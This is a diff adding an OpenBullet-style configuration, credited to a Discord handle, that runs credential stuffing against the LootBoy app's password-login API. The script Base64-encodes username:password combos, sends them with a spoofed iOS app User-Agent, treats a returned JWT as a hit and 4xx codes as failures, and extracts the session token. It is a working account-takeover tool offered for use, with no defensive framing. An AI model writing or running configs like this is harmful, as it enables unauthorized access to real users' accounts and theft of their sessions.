@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Lootboy",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-01T19:33:44.608332+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "COMBO" 
+
+REQUEST POST "https://api.lootboy.de/v2/auth/passwordLogin" 
+  
+  HEADER "Host: api.lootboy.de" 
+  HEADER "Content-Length: 0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "lib-version: 0.1.0" 
+  HEADER "Accept-Language: de" 
+  HEADER "Authorization: Basic <COMBO>" 
+  HEADER "User-Agent: LootBoyApp/1.22.29.109258247 CFNetwork/974.2.1 Darwin/18.0.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "eyJ" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TOKEN" 
+
